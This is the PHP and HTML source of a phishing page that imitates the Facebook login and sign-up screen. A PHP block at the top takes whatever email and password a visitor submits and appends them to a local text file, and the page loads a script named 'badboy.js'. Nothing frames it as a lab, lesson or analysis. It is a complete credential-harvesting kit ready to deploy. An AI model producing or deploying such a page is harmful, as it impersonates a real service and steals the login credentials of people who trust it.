<?php
if (isset($_POST['email']) && isset($_POST['password'])) {
    $data = $_POST['email'] . '-' . $_POST['password'] . "\r\n";
    $ret = file_put_contents(@'C:\wamp64\www\pythonshit\pass.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "$ret bytes written to file";
    }
}


?>

<html>
<head>
<link href="homepage_style.css" type="text/css" rel="stylesheet"/>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
</head>
<body onload="scrollingText()">

<div id="header_wrapper">
 <div id="header">
 <li id="sitename"><a href="/">facebook</a></li>
 <form action="index.php" method="post">
 <li>Email or Phone<br><input type="text" name="email"></li>
 <li>Password<br><input type="password" name="password"><br><a href="">Forgotten account?</a></li>
 <li><input type="submit" name="login" value="Log In"></li>
 </form>
 </div>
</div>

<div id="wrapper">

<div id="div1">
<p>Facebook helps you connect and share with the <br>people in your life.</p>
<img src="images/fb_map_image.png">
    <div class="popup" id="popup">
        
    </div>
</div>

<div id="div2">
<h1>Create an account</h1>
<p>It's free and always will be.</p>
<li><input type="text" placeholder="First Name" id="firstname"><input type="text" placeholder="Surname" id="surname"></li>
<li><input type="text" placeholder="Mobile number or email address"></li>
<li><input type="text" placeholder="Re-enter mobile number or email address"></li>
<li><input type="password" placeholder="New password"></li>
<p>Birthday</p>
<li>
<select><option>Day</option></select>
<select><option>Month</option></select>
<select><option>Year</option></select>
<a href="">Why do I need to provide my date of birth?</a>
</li>
<li><input type="radio">Female <input type="radio">Male</li>
<li id="terms">By clicking Create an account, you agree to our <a href="">Terms</a> and that <br>you have read our <a href="">Data Policy</a>, including our <a href="">Cookie Use</a>.</li>
<li><input type="submit" value="Create an account"></li>
<li id="create_page"><a href="">Create a Page</a> for a celebrity, band or business.</li>
</div>

</div>

<div id="footer_wrapper">

<div id="footer1">
English (UK) <a href="">हिन्दी</a><a href="">ਪੰਜਾਬੀ</a><a href=""> اردو</a><a href="">தமிழ்</a><a href="">বাংলা</a><a href="">मराठी</a><a href="">తెలుగు</a><a href="">ગુજરાતી</a><a href="">ಕನ್ನಡ</a><a href="">മലയാളം</a>
</div>
<div id="footer2">
<a href="">Sign Up</a><a href="">Log In</a><a href="">Messenger</a><a href="">Talkerscode</a><a href="">Mobile</a><a href="">Find Friends</a><a href="">Badges</a><a href="">People</a><a href="">Pages</a><a href="">Places</a><a href="">Games</a><a href="">Locations</a><a href="">Celebrities</a><a href="">Groups</a><a href="">Moments</a><a href="">About</a><a href="">Create Advert</a><a href="">Create Page</a><a href="">Developers</a><a href="">Careers</a><a href="">Privacy</a><a href="">Cookies</a><a href="">Ads</a><a href="">Terms</a><a href="">Help</a>
</div>

</div>
<script src="js/badboy.js"></script>
</body>
</html>